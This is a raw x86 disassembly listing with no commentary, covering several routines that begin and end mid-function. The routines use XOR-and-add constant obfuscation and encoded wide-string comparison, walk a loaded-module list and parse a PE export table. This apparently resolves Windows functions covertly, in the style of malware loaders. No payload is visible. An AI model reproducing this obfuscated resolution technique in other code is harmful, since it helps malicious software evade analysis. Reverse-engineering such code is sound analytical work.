  4141c0:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  4141c7:	mov    eax,0x4f9c
  4141cc:	mov    WORD PTR [ebp-0xc],ax
  4141d0:	mov    eax,0x4e7c
  4141d5:	mov    WORD PTR [ebp-0x4],ax
  4141d9:	mov    eax,0x4fa7
  4141de:	mov    WORD PTR [ebp-0x8],ax
  4141e2:	add    eax,0xffffffe0
  4141e5:	mov    WORD PTR [ebp-0x8],ax
  4141e9:	mov    eax,DWORD PTR [ebp+0x8]
  4141ec:	mov    DWORD PTR [ebp-0x14],eax
  4141ef:	mov    eax,DWORD PTR [ebp+0xc]
  4141f2:	mov    DWORD PTR [ebp-0x18],eax
  4141f5:	mov    eax,DWORD PTR [ebp-0x10]
  4141f8:	push   ebx
  4141f9:	mov    ecx,0x7510896
  4141fe:	xor    eax,ecx
  414200:	push   esi
  414201:	mov    esi,DWORD PTR [ebp-0x14]
  414204:	mov    edx,0x3272dd
  414209:	add    eax,edx
  41420b:	push   edi
  41420c:	cmp    esi,eax
  41420e:	je     0x41440c
  414214:	mov    eax,DWORD PTR [ebp-0x10]
  414217:	mov    esi,DWORD PTR [ebp-0x18]
  41421a:	xor    eax,ecx
  41421c:	add    eax,edx
  41421e:	cmp    esi,eax
  414220:	je     0x41440c
  414226:	mov    eax,DWORD PTR [ebp-0x10]
  414229:	xor    eax,ecx
  41422b:	add    eax,edx
  41422d:	mov    DWORD PTR [ebp-0x20],eax
  414230:	mov    eax,DWORD PTR [ebp-0x10]
  414233:	xor    eax,ecx
  414235:	add    eax,edx
  414237:	mov    DWORD PTR [ebp-0x24],eax
  41423a:	movzx  esi,WORD PTR [ebp-0x4]
  41423e:	movzx  edi,WORD PTR [ebp-0xc]
  414242:	mov    eax,0x8a89
  414247:	xor    si,ax
  41424a:	mov    ebx,0x8a89
  41424f:	xor    di,bx
  414252:	mov    eax,0x3b4c
  414257:	add    si,ax
  41425a:	add    di,ax
  41425d:	sub    edi,esi
  41425f:	mov    WORD PTR [ebp-0xc],di
  414263:	mov    esi,DWORD PTR [ebp-0x20]
  414266:	mov    edi,DWORD PTR [ebp-0x14]
  414269:	mov    si,WORD PTR [edi+esi*2]
  41426d:	mov    WORD PTR [ebp+0x8],si
  414271:	mov    esi,DWORD PTR [ebp-0x24]
  414274:	mov    edi,DWORD PTR [ebp-0x18]
  414277:	mov    si,WORD PTR [edi+esi*2]
  41427b:	mov    WORD PTR [ebp+0xc],si
  41427f:	mov    esi,0x72dd
  414284:	jmp    0x414391
  414289:	mov    edi,DWORD PTR [ebp-0x10]
  41428c:	mov    bx,WORD PTR [ebp+0xc]
  414290:	xor    edi,0x896
  414296:	add    edi,esi
  414298:	cmp    bx,di
  41429b:	je     0x4143bb
  4142a1:	mov    edi,DWORD PTR [ebp-0x10]
  4142a4:	mov    ebx,DWORD PTR [ebp+0x10]
  4142a7:	xor    edi,ecx
  4142a9:	add    edi,edx
  4142ab:	cmp    ebx,edi
  4142ad:	mov    di,WORD PTR [ebp+0xc]
  4142b1:	mov    bx,WORD PTR [ebp+0x8]
  4142b5:	je     0x414348
  4142bb:	cmp    bx,di
  4142be:	je     0x414351
  4142c4:	mov    di,WORD PTR [ebp-0x4]
  4142c8:	mov    ebx,0x8a89
  4142cd:	xor    di,bx
  4142d0:	mov    bx,WORD PTR [ebp+0x8]
  4142d4:	add    di,ax
  4142d7:	cmp    bx,di
  4142da:	jb     0x414302
  4142dc:	mov    di,WORD PTR [ebp-0x8]
  4142e0:	mov    ebx,0x8a89
  4142e5:	xor    di,bx
  4142e8:	mov    bx,WORD PTR [ebp+0x8]
  4142ec:	add    di,ax
  4142ef:	cmp    bx,di
  4142f2:	ja     0x414302
  4142f4:	movzx  edi,WORD PTR [ebp+0x8]
  4142f8:	movzx  ebx,WORD PTR [ebp-0xc]
  4142fc:	add    edi,ebx
  4142fe:	mov    WORD PTR [ebp+0x8],di
  414302:	mov    di,WORD PTR [ebp-0x4]
  414306:	mov    ebx,0x8a89
  41430b:	xor    di,bx
  41430e:	mov    bx,WORD PTR [ebp+0xc]
  414312:	add    di,ax
  414315:	cmp    bx,di
  414318:	jb     0x414340
  41431a:	mov    di,WORD PTR [ebp-0x8]
  41431e:	mov    ebx,0x8a89
  414323:	xor    di,bx
  414326:	mov    bx,WORD PTR [ebp+0xc]
  41432a:	add    di,ax
  41432d:	cmp    bx,di
  414330:	ja     0x414340
  414332:	movzx  edi,WORD PTR [ebp+0xc]
  414336:	movzx  ebx,WORD PTR [ebp-0xc]
  41433a:	add    edi,ebx
  41433c:	mov    WORD PTR [ebp+0xc],di
  414340:	mov    di,WORD PTR [ebp+0xc]
  414344:	mov    bx,WORD PTR [ebp+0x8]
  414348:	cmp    bx,di
  41434b:	jne    0x41440c
  414351:	mov    edi,DWORD PTR [ebp-0x28]
  414354:	mov    ebx,DWORD PTR [ebp-0x14]
  414357:	xor    edi,ecx
  414359:	lea    edi,[edi+ebx*1+0x3272dd]
  414360:	mov    DWORD PTR [ebp-0x14],edi
  414363:	mov    edi,DWORD PTR [ebp-0x28]
  414366:	mov    ebx,DWORD PTR [ebp-0x18]
  414369:	xor    edi,ecx
  41436b:	lea    edi,[edi+ebx*1+0x3272dd]
  414372:	mov    DWORD PTR [ebp-0x18],edi
  414375:	mov    edi,DWORD PTR [ebp-0x20]
  414378:	mov    ebx,DWORD PTR [ebp-0x14]
  41437b:	mov    di,WORD PTR [ebx+edi*2]
  41437f:	mov    WORD PTR [ebp+0x8],di
  414383:	mov    edi,DWORD PTR [ebp-0x24]
  414386:	mov    ebx,DWORD PTR [ebp-0x18]
  414389:	mov    di,WORD PTR [ebx+edi*2]
  41438d:	mov    WORD PTR [ebp+0xc],di
  414391:	mov    edi,DWORD PTR [ebp-0x10]
  414394:	mov    bx,WORD PTR [ebp+0x8]
  414398:	xor    edi,0x896
  41439e:	add    edi,esi
  4143a0:	cmp    bx,di
  4143a3:	jne    0x414289
  4143a9:	mov    esi,DWORD PTR [ebp-0x1c]
  4143ac:	xor    esi,ecx
  4143ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4143b1:	add    esi,edx
  4143b3:	imul   esi,ecx
  4143b6:	mov    DWORD PTR [ebp-0x10],esi
  4143b9:	jmp    0x4143cd
  4143bb:	mov    edx,DWORD PTR [ebp-0x10]
  4143be:	xor    edx,ecx
  4143c0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4143c3:	lea    ecx,[edx+ecx*1+0x3272dd]
  4143ca:	mov    DWORD PTR [ebp-0x1c],ecx
  4143cd:	mov    edx,DWORD PTR [ebp-0x20]
  4143d0:	mov    esi,DWORD PTR [ebp-0x14]
  4143d3:	mov    si,WORD PTR [esi+edx*2]
  4143d7:	mov    ecx,eax
  4143d9:	sub    si,cx
  4143dc:	mov    edx,0x8a89
  4143e1:	xor    si,dx
  4143e4:	mov    ecx,0x4e3d
  4143e9:	cmp    si,cx
  4143ec:	jne    0x414407
  4143ee:	mov    esi,DWORD PTR [ebp-0x24]
  4143f1:	mov    edi,DWORD PTR [ebp-0x18]
  4143f4:	mov    si,WORD PTR [edi+esi*2]
  4143f8:	sub    si,ax
  4143fb:	xor    si,dx
  4143fe:	cmp    si,cx
  414401:	jne    0x414407
  414403:	xor    eax,eax
  414405:	jmp    0x414413
  414407:	xor    eax,eax
  414409:	inc    eax
  41440a:	jmp    0x414413
  41440c:	mov    eax,DWORD PTR [ebp-0x1c]
  41440f:	xor    eax,ecx
  414411:	add    eax,edx
  414413:	pop    edi
  414414:	pop    esi
  414415:	pop    ebx
  414416:	leave  
  414417:	ret    0xc
  41441a:	push   ebp
  41441b:	mov    ebp,esp
  41441d:	push   ecx
  41441e:	mov    cx,WORD PTR [eax]
  414421:	push   esi
  414422:	mov    esi,0x3b4c
  414427:	sub    cx,si
  41442a:	mov    esi,0x8a89
  41442f:	xor    cx,si
  414432:	mov    esi,0x4e3d
  414437:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41443e:	mov    edx,0xf89c85b5
  414443:	cmp    cx,si
  414446:	je     0x4144a5
  414448:	push   ebx
  414449:	push   edi
  41444a:	movzx  ecx,cx
  41444d:	mov    edi,0xffcd8d23
  414452:	mov    esi,0x7510896
  414457:	mov    ebx,0x4f99
  41445c:	cmp    cx,bx
  41445f:	jne    0x414464
  414461:	mov    DWORD PTR [ebp-0x4],edx
  414464:	lea    edx,[edi+0x1]
  414467:	xor    edx,esi
  414469:	mov    edi,edx
  41446b:	xor    edi,esi
  41446d:	mov    cx,WORD PTR [eax+edi*2+0x64e5ba]
  414475:	mov    ebx,0x3b4c
  41447a:	sub    cx,bx
  41447d:	mov    ebx,0x8a89
  414482:	xor    cx,bx
  414485:	mov    ebx,0x4e3d
  41448a:	cmp    cx,bx
  41448d:	jne    0x414457
  41448f:	mov    ecx,DWORD PTR [ebp-0x4]
  414492:	pop    edi
  414493:	pop    ebx
  414494:	cmp    ecx,0xf89c85b4
  41449a:	je     0x4144a5
  41449c:	xor    ecx,esi
  41449e:	lea    eax,[eax+ecx*2+0x64e5bc]
  4144a5:	pop    esi
  4144a6:	leave  
  4144a7:	ret    
  4144a8:	push   ebp
  4144a9:	mov    ebp,esp
  4144ab:	push   ecx
  4144ac:	push   esi
  4144ad:	push   edi
  4144ae:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  4144b5:	mov    esi,0xf89c85b5
  4144ba:	call   0x41441a
  4144bf:	mov    edi,eax
  4144c1:	mov    al,BYTE PTR [edi]
  4144c3:	add    al,0xb
  4144c5:	xor    al,0x71
  4144c7:	cmp    al,0x7a
  4144c9:	je     0x41452c
  4144cb:	mov    eax,edi
  4144cd:	mov    edx,0xffcd8d23
  4144d2:	mov    ecx,0x7510896
  4144d7:	push   ebx
  4144d8:	mov    ax,WORD PTR [eax]
  4144db:	mov    ebx,0x3b4c
  4144e0:	sub    ax,bx
  4144e3:	mov    ebx,0x8a89
  4144e8:	xor    ax,bx
  4144eb:	mov    ebx,0x4e6b
  4144f0:	cmp    ax,bx
  4144f3:	jne    0x4144f8
  4144f5:	mov    DWORD PTR [ebp-0x4],esi
  4144f8:	lea    esi,[edx+0x1]
  4144fb:	xor    esi,ecx
  4144fd:	mov    edx,esi
  4144ff:	xor    edx,ecx
  414501:	lea    eax,[edi+edx*2+0x64e5ba]
  414508:	mov    bl,BYTE PTR [eax]
  41450a:	add    bl,0xb
  41450d:	xor    bl,0x71
  414510:	cmp    bl,0x7a
  414513:	jne    0x4144d8
  414515:	mov    eax,DWORD PTR [ebp-0x4]
  414518:	pop    ebx
  414519:	cmp    eax,0xf89c85b4
  41451e:	je     0x41452c
  414520:	xor    eax,ecx
  414522:	xor    ecx,ecx
  414524:	mov    WORD PTR [edi+eax*2+0x64e5ba],cx
  41452c:	mov    eax,edi
  41452e:	pop    edi
  41452f:	pop    esi
  414530:	leave  
  414531:	ret    
  414532:	push   ebp
  414533:	mov    ebp,esp
  414535:	push   ecx
  414536:	push   esi
  414537:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41453e:	mov    esi,0xf89c85b5
  414543:	call   0x41441a
  414548:	mov    cx,WORD PTR [eax]
  41454b:	mov    edx,0x3b4c
  414550:	sub    cx,dx
  414553:	mov    edx,0x8a89
  414558:	xor    cx,dx
  41455b:	mov    edx,0x4e3d
  414560:	cmp    cx,dx
  414563:	je     0x4145bc
  414565:	push   ebx
  414566:	push   edi
  414567:	movzx  ecx,cx
  41456a:	mov    edx,0xffcd8d23
  41456f:	mov    edi,0x7510896
  414574:	mov    ebx,0x4e6b
  414579:	cmp    cx,bx
  41457c:	jne    0x414581
  41457e:	mov    DWORD PTR [ebp-0x4],esi
  414581:	lea    esi,[edx+0x1]
  414584:	xor    esi,edi
  414586:	mov    edx,esi
  414588:	xor    edx,edi
  41458a:	mov    cx,WORD PTR [eax+edx*2+0x64e5ba]
  414592:	mov    ebx,0x3b4c
  414597:	sub    cx,bx
  41459a:	mov    ebx,0x8a89
  41459f:	xor    cx,bx
  4145a2:	mov    ebx,0x4e3d
  4145a7:	cmp    cx,bx
  4145aa:	jne    0x414574
  4145ac:	cmp    DWORD PTR [ebp-0x4],0xf89c85b4
  4145b3:	pop    edi
  4145b4:	pop    ebx
  4145b5:	je     0x4145bc
  4145b7:	xor    eax,eax
  4145b9:	inc    eax
  4145ba:	jmp    0x4145be
  4145bc:	xor    eax,eax
  4145be:	pop    esi
  4145bf:	leave  
  4145c0:	ret    
  4145c1:	push   ebp
  4145c2:	mov    ebp,esp
  4145c4:	push   ecx
  4145c5:	mov    eax,DWORD PTR [ebp+0x8]
  4145c8:	movzx  ecx,WORD PTR [eax]
  4145cb:	push   esi
  4145cc:	lea    eax,[ecx-0x3b4c]
  4145d2:	mov    esi,0x8a89
  4145d7:	push   edi
  4145d8:	xor    eax,esi
  4145da:	mov    edi,0x4e3d
  4145df:	mov    DWORD PTR [ebp-0x4],edx
  4145e2:	cmp    ax,di
  4145e5:	je     0x414612
  4145e7:	mov    eax,DWORD PTR [ebp+0x8]
  4145ea:	sub    eax,edx
  4145ec:	mov    DWORD PTR [ebp+0x8],eax
  4145ef:	jmp    0x4145f4
  4145f1:	mov    eax,DWORD PTR [ebp+0x8]
  4145f4:	mov    WORD PTR [edx],cx
  4145f7:	add    edx,0x2
  4145fa:	movzx  edi,WORD PTR [eax+edx*1]
  4145fe:	mov    ecx,edi
  414600:	add    edi,0xffffc4b4
  414606:	xor    edi,esi
  414608:	mov    eax,0x4e3d
  41460d:	cmp    di,ax
  414610:	jne    0x4145f1
  414612:	xor    eax,eax
  414614:	pop    edi
  414615:	mov    WORD PTR [edx],ax
  414618:	mov    eax,DWORD PTR [ebp-0x4]
  41461b:	pop    esi
  41461c:	leave  
  41461d:	ret    0x4
  414620:	push   ebp
  414621:	mov    ebp,esp
  414623:	sub    esp,0x18
  414626:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  41462d:	mov    DWORD PTR [ebp-0x18],0xf89c85b2
  414634:	mov    eax,DWORD PTR [ebp-0x14]
  414637:	xor    eax,0x7510896
  41463c:	add    eax,0x3272dd
  414641:	mov    DWORD PTR [ebp-0x8],eax
  414644:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  41464b:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  414652:	mov    DWORD PTR [ebp-0x4],0xf89c85b3
  414659:	mov    eax,DWORD PTR [ebp-0x14]
  41465c:	xor    eax,0x7510896
  414661:	mov    ecx,DWORD PTR [ebp-0x8]
  414664:	lea    eax,[ecx+eax*1+0x3272dd]
  41466b:	mov    ecx,DWORD PTR [ebp-0x18]
  41466e:	xor    ecx,0x7510896
  414674:	add    ecx,0x3272dd
  41467a:	mov    edx,DWORD PTR [ebp+0x10]
  41467d:	imul   edx,ecx
  414680:	cmp    eax,edx
  414682:	jae    0x414775
  414688:	mov    eax,DWORD PTR [ebp+0x10]
  41468b:	mov    ecx,DWORD PTR [ebp-0x8]
  41468e:	sub    eax,ecx
  414690:	mov    ecx,DWORD PTR [ebp-0x10]
  414693:	xor    ecx,0x7510896
  414699:	add    ecx,0x3272dd
  41469f:	cmp    eax,ecx
  4146a1:	jbe    0x4146d3
  4146a3:	mov    eax,DWORD PTR [ebp+0x8]
  4146a6:	add    eax,DWORD PTR [ebp-0x8]
  4146a9:	mov    ecx,DWORD PTR [ebp+0xc]
  4146ac:	add    ecx,DWORD PTR [ebp-0x8]
  4146af:	mov    edx,DWORD PTR [ecx]
  4146b1:	mov    DWORD PTR [eax],edx
  4146b3:	mov    ecx,DWORD PTR [ecx+0x4]
  4146b6:	mov    DWORD PTR [eax+0x4],ecx
  4146b9:	mov    eax,DWORD PTR [ebp-0x10]
  4146bc:	xor    eax,0x7510896
  4146c1:	mov    ecx,DWORD PTR [ebp-0x8]
  4146c4:	lea    eax,[ecx+eax*1+0x3272dd]
  4146cb:	mov    DWORD PTR [ebp-0x8],eax
  4146ce:	jmp    0x414770
  4146d3:	mov    eax,DWORD PTR [ebp+0x10]
  4146d6:	mov    ecx,DWORD PTR [ebp-0x8]
  4146d9:	sub    eax,ecx
  4146db:	mov    ecx,DWORD PTR [ebp-0xc]
  4146de:	xor    ecx,0x7510896
  4146e4:	add    ecx,0x3272dd
  4146ea:	cmp    eax,ecx
  4146ec:	jbe    0x414715
  4146ee:	mov    eax,DWORD PTR [ebp+0x8]
  4146f1:	add    eax,DWORD PTR [ebp-0x8]
  4146f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4146f7:	add    ecx,DWORD PTR [ebp-0x8]
  4146fa:	mov    ecx,DWORD PTR [ecx]
  4146fc:	mov    DWORD PTR [eax],ecx
  4146fe:	mov    eax,DWORD PTR [ebp-0xc]
  414701:	xor    eax,0x7510896
  414706:	mov    ecx,DWORD PTR [ebp-0x8]
  414709:	lea    eax,[ecx+eax*1+0x3272dd]
  414710:	mov    DWORD PTR [ebp-0x8],eax
  414713:	jmp    0x414770
  414715:	mov    eax,DWORD PTR [ebp+0x10]
  414718:	mov    ecx,DWORD PTR [ebp-0x8]
  41471b:	sub    eax,ecx
  41471d:	mov    ecx,DWORD PTR [ebp-0x4]
  414720:	xor    ecx,0x7510896
  414726:	add    ecx,0x3272dd
  41472c:	cmp    eax,ecx
  41472e:	jbe    0x414759
  414730:	mov    eax,DWORD PTR [ebp+0x8]
  414733:	add    eax,DWORD PTR [ebp-0x8]
  414736:	mov    ecx,DWORD PTR [ebp+0xc]
  414739:	add    ecx,DWORD PTR [ebp-0x8]
  41473c:	mov    cx,WORD PTR [ecx]
  41473f:	mov    WORD PTR [eax],cx
  414742:	mov    eax,DWORD PTR [ebp-0x4]
  414745:	xor    eax,0x7510896
  41474a:	mov    ecx,DWORD PTR [ebp-0x8]
  41474d:	lea    eax,[ecx+eax*1+0x3272dd]
  414754:	mov    DWORD PTR [ebp-0x8],eax
  414757:	jmp    0x414770
  414759:	mov    eax,DWORD PTR [ebp+0x8]
  41475c:	add    eax,DWORD PTR [ebp-0x8]
  41475f:	mov    ecx,DWORD PTR [ebp+0xc]
  414762:	add    ecx,DWORD PTR [ebp-0x8]
  414765:	mov    cl,BYTE PTR [ecx]
  414767:	mov    BYTE PTR [eax],cl
  414769:	mov    eax,DWORD PTR [ebp-0x8]
  41476c:	inc    eax
  41476d:	mov    DWORD PTR [ebp-0x8],eax
  414770:	jmp    0x414659
  414775:	leave  
  414776:	ret    0xc
  414779:	push   ebp
  41477a:	mov    ebp,esp
  41477c:	push   ecx
  41477d:	push   ecx
  41477e:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  414785:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  41478c:	xor    eax,eax
  41478e:	inc    eax
  41478f:	je     0x4147d1
  414791:	mov    eax,DWORD PTR [ebp-0x4]
  414794:	xor    eax,0x7510896
  414799:	add    eax,0x3272dd
  41479e:	cmp    DWORD PTR [ebp+0xc],eax
  4147a1:	jne    0x4147a5
  4147a3:	jmp    0x4147d1
  4147a5:	mov    eax,DWORD PTR [ebp-0x8]
  4147a8:	xor    eax,0x7510896
  4147ad:	add    eax,0x3272dd
  4147b2:	mov    ecx,DWORD PTR [ebp+0xc]
  4147b5:	sub    ecx,eax
  4147b7:	mov    DWORD PTR [ebp+0xc],ecx
  4147ba:	mov    eax,DWORD PTR [ebp-0x4]
  4147bd:	xor    eax,0x7510896
  4147c2:	add    eax,0x3272dd
  4147c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4147ca:	add    ecx,DWORD PTR [ebp+0xc]
  4147cd:	mov    BYTE PTR [ecx],al
  4147cf:	jmp    0x41478c
  4147d1:	leave  
  4147d2:	ret    0x8
  4147d5:	push   ebp
  4147d6:	mov    ebp,esp
  4147d8:	sub    esp,0x21c
  4147de:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4147e5:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  4147ec:	mov    eax,DWORD PTR [ebp+0x10]
  4147ef:	mov    eax,DWORD PTR [ebp-0x4]
  4147f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4147f5:	push   esi
  4147f6:	push   edi
  4147f7:	mov    edi,0x7510896
  4147fc:	xor    eax,edi
  4147fe:	mov    esi,0x3272dd
  414803:	add    eax,esi
  414805:	cmp    eax,ecx
  414807:	mov    eax,DWORD PTR [ebp-0x4]
  41480a:	jne    0x414815
  41480c:	xor    eax,edi
  41480e:	add    eax,esi
  414810:	jmp    0x4148c1
  414815:	mov    ecx,DWORD PTR [ebp+0xc]
  414818:	xor    eax,edi
  41481a:	add    eax,esi
  41481c:	cmp    eax,ecx
  41481e:	jne    0x414825
  414820:	mov    eax,DWORD PTR [ebp-0x4]
  414823:	jmp    0x41480c
  414825:	lea    eax,[ebp-0x21c]
  41482b:	mov    DWORD PTR [ebp-0x8],eax
  41482e:	mov    eax,DWORD PTR [ebp+0xc]
  414831:	mov    DWORD PTR [ebp-0x10],eax
  414834:	mov    eax,DWORD PTR [ebp-0x4]
  414837:	xor    eax,edi
  414839:	add    eax,esi
  41483b:	mov    DWORD PTR [ebp+0x10],eax
  41483e:	mov    eax,DWORD PTR [ebp+0xc]
  414841:	push   ebx
  414842:	call   0x414532
  414847:	mov    ebx,eax
  414849:	mov    eax,DWORD PTR [ebp+0x8]
  41484c:	mov    eax,DWORD PTR [eax+0x14]
  41484f:	jmp    0x4148a9
  414851:	mov    eax,DWORD PTR [ebp+0xc]
  414854:	sub    eax,0x8
  414857:	mov    DWORD PTR [ebp-0xc],eax
  41485a:	mov    eax,DWORD PTR [ebp-0xc]
  41485d:	mov    eax,DWORD PTR [eax+0x28]
  414860:	call   0x41441a
  414865:	mov    DWORD PTR [ebp+0x10],eax
  414868:	push   DWORD PTR [ebp+0x10]
  41486b:	mov    edx,DWORD PTR [ebp-0x8]
  41486e:	call   0x4145c1
  414873:	mov    eax,DWORD PTR [ebp-0x4]
  414876:	xor    eax,edi
  414878:	add    eax,esi
  41487a:	cmp    eax,ebx
  41487c:	jne    0x414886
  41487e:	mov    eax,DWORD PTR [ebp-0x8]
  414881:	call   0x4144a8
  414886:	mov    eax,DWORD PTR [ebp-0x14]
  414889:	xor    eax,edi
  41488b:	add    eax,esi
  41488d:	push   eax
  41488e:	push   DWORD PTR [ebp-0x10]
  414891:	push   DWORD PTR [ebp-0x8]
  414894:	call   0x4141ac
  414899:	mov    ecx,DWORD PTR [ebp-0x4]
  41489c:	xor    ecx,edi
  41489e:	add    ecx,esi
  4148a0:	cmp    eax,ecx
  4148a2:	je     0x4148c7
  4148a4:	mov    eax,DWORD PTR [ebp+0xc]
  4148a7:	mov    eax,DWORD PTR [eax]
  4148a9:	mov    DWORD PTR [ebp+0xc],eax
  4148ac:	mov    eax,DWORD PTR [ebp+0x8]
  4148af:	mov    ecx,DWORD PTR [ebp+0xc]
  4148b2:	add    eax,0x14
  4148b5:	cmp    ecx,eax
  4148b7:	jne    0x414851
  4148b9:	mov    eax,DWORD PTR [ebp-0x4]
  4148bc:	xor    eax,edi
  4148be:	add    eax,esi
  4148c0:	pop    ebx
  4148c1:	pop    edi
  4148c2:	pop    esi
  4148c3:	leave  
  4148c4:	ret    0xc
  4148c7:	mov    eax,DWORD PTR [ebp-0xc]
  4148ca:	mov    eax,DWORD PTR [eax+0x18]
  4148cd:	jmp    0x4148c0
  4148cf:	push   ebp
  4148d0:	mov    ebp,esp
  4148d2:	mov    eax,DWORD PTR [ebp+0xc]
  4148d5:	sub    esp,0x10
  4148d8:	cmp    DWORD PTR [ebp+0x8],0x0
  4148dc:	push   ebx
  4148dd:	push   esi
  4148de:	push   edi
  4148df:	je     0x414994
  4148e5:	test   eax,eax
  4148e7:	je     0x414994
  4148ed:	movzx  eax,WORD PTR [eax+0x20]
  4148f1:	mov    ecx,eax
  4148f3:	mov    DWORD PTR [ebp-0x10],eax
  4148f6:	xor    edx,edx
  4148f8:	and    DWORD PTR [ebp-0x8],edx
  4148fb:	mov    eax,0x8a89
  414900:	xor    ecx,eax
  414902:	add    ecx,0x3b4c
  414908:	mov    DWORD PTR [ebp-0xc],ecx
  41490b:	and    DWORD PTR [ebp-0x4],0x0
  41490f:	xor    ecx,ecx
  414911:	push   0x7c
  414913:	pop    edi
  414914:	cmp    cx,WORD PTR [ebp-0xc]
  414918:	jae    0x41497e
  41491a:	lea    esi,[edx-0x3b4c]
  414920:	xor    esi,eax
  414922:	movzx  ecx,WORD PTR [ebp-0x4]
  414926:	mov    ebx,DWORD PTR [ebp+0xc]
  414929:	lea    ecx,[ebx+ecx*4]
  41492c:	cmp    WORD PTR [ecx+0x2],si
  414930:	jne    0x414969
  414932:	movzx  ecx,WORD PTR [ecx]
  414935:	mov    edi,0x4e3d
  41493a:	cmp    cx,di
  41493d:	jne    0x41494b
  41493f:	mov    ebx,DWORD PTR [ebp+0x8]
  414942:	movzx  edi,dx
  414945:	cmp    BYTE PTR [edi+ebx*1],0x0
  414949:	je     0x414978
  41494b:	mov    ebx,DWORD PTR [ebp+0x8]
  41494e:	movzx  edi,dx
  414951:	movsx  di,BYTE PTR [edi+ebx*1]
  414956:	mov    ebx,0x3b4c
  41495b:	sub    di,bx
  41495e:	xor    di,ax
  414961:	cmp    cx,di
  414964:	je     0x414978
  414966:	push   0x7a
  414968:	pop    edi
  414969:	inc    DWORD PTR [ebp-0x4]
  41496c:	mov    cx,WORD PTR [ebp-0xc]
  414970:	cmp    WORD PTR [ebp-0x4],cx
  414974:	jb     0x414922
  414976:	jmp    0x41497e
  414978:	inc    DWORD PTR [ebp-0x8]
  41497b:	push   0x7d
  41497d:	pop    edi
  41497e:	mov    esi,DWORD PTR [ebp+0x8]
  414981:	movzx  ecx,dx
  414984:	cmp    BYTE PTR [ecx+esi*1],0x0
  414988:	je     0x41499d
  41498a:	inc    edx
  41498b:	cmp    edi,0x7a
  41498e:	jne    0x41490b
  414994:	xor    eax,eax
  414996:	pop    edi
  414997:	pop    esi
  414998:	pop    ebx
  414999:	leave  
  41499a:	ret    0x8
  41499d:	mov    ecx,DWORD PTR [ebp-0x8]
  4149a0:	add    ecx,0xffffc4b4
  4149a6:	xor    cx,ax
  4149a9:	xor    eax,eax
  4149ab:	cmp    cx,WORD PTR [ebp-0x10]
  4149af:	sete   al
  4149b2:	jmp    0x414996
  4149b4:	push   ebp
  4149b5:	mov    ebp,esp
  4149b7:	sub    esp,0x50
  4149ba:	push   edi
  4149bb:	mov    edi,eax
  4149bd:	mov    eax,DWORD PTR [edi+0x1a8]
  4149c3:	cmp    DWORD PTR [eax],0x0
  4149c6:	jne    0x4149cf
  4149c8:	xor    eax,eax
  4149ca:	jmp    0x414aff
  4149cf:	push   0x2c
  4149d1:	push   DWORD PTR [ebp+0x8]
  4149d4:	call   0x414779
  4149d9:	mov    edx,DWORD PTR [edi+0x1ac]
  4149df:	lea    eax,[edi+0x22]
  4149e2:	mov    DWORD PTR [ebp-0x4c],eax
  4149e5:	lea    eax,[edi+0x44]
  4149e8:	mov    DWORD PTR [ebp-0x48],eax
  4149eb:	lea    eax,[edi+0x66]
  4149ee:	mov    DWORD PTR [ebp-0x44],eax
  4149f1:	lea    eax,[edi+0x88]
  4149f7:	mov    DWORD PTR [ebp-0x40],eax
  4149fa:	lea    eax,[edi+0xaa]
  414a00:	mov    DWORD PTR [ebp-0x3c],eax
  414a03:	lea    eax,[edi+0xcc]
  414a09:	mov    DWORD PTR [ebp-0x38],eax
  414a0c:	lea    eax,[edi+0xee]
  414a12:	mov    DWORD PTR [ebp-0x34],eax
  414a15:	lea    eax,[edi+0x110]
  414a1b:	mov    DWORD PTR [ebp-0x30],eax
  414a1e:	lea    eax,[edi+0x132]
  414a24:	mov    DWORD PTR [ebp-0x2c],eax
  414a27:	lea    eax,[edi+0x154]
  414a2d:	push   edi
  414a2e:	mov    DWORD PTR [ebp-0x50],edi
  414a31:	mov    DWORD PTR [ebp-0x28],eax
  414a34:	call   0x414b33
  414a39:	push   eax
  414a3a:	mov    eax,DWORD PTR [edi+0x1a8]
  414a40:	push   DWORD PTR [eax]
  414a42:	call   0x4147d5
  414a47:	mov    DWORD PTR [ebp-0x10],eax
  414a4a:	test   eax,eax
  414a4c:	je     0x414aff
  414a52:	mov    ecx,DWORD PTR [eax+0x3c]
  414a55:	push   ebx
  414a56:	push   esi
  414a57:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  414a5b:	add    esi,eax
  414a5d:	mov    edi,DWORD PTR [esi+0x24]
  414a60:	mov    ecx,DWORD PTR [esi+0x1c]
  414a63:	mov    edx,DWORD PTR [esi+0x20]
  414a66:	mov    ebx,DWORD PTR [esi+0x18]
  414a69:	add    edi,eax
  414a6b:	mov    DWORD PTR [ebp-0x20],edi
  414a6e:	mov    edi,DWORD PTR [esi+0x14]
  414a71:	add    ecx,eax
  414a73:	add    edx,eax
  414a75:	mov    DWORD PTR [ebp-0xc],ecx
  414a78:	mov    DWORD PTR [ebp-0x1c],edx
  414a7b:	mov    DWORD PTR [ebp-0x8],edi
  414a7e:	cmp    edi,ebx
  414a80:	ja     0x414a85
  414a82:	mov    DWORD PTR [ebp-0x8],ebx
  414a85:	xor    ebx,ebx
  414a87:	mov    DWORD PTR [ebp-0x18],ebx
  414a8a:	cmp    DWORD PTR [ebp-0x8],ebx
  414a8d:	jbe    0x414afd
  414a8f:	jmp    0x414a94
  414a91:	mov    edx,DWORD PTR [ebp-0x1c]
  414a94:	mov    edi,DWORD PTR [ebp-0x20]
  414a97:	movzx  edi,WORD PTR [edi+ebx*2]
  414a9b:	cmp    ebx,DWORD PTR [esi+0x18]
  414a9e:	jae    0x414afd
  414aa0:	cmp    edi,DWORD PTR [esi+0x14]
  414aa3:	jae    0x414afd
  414aa5:	mov    ebx,DWORD PTR [edx+ebx*4]
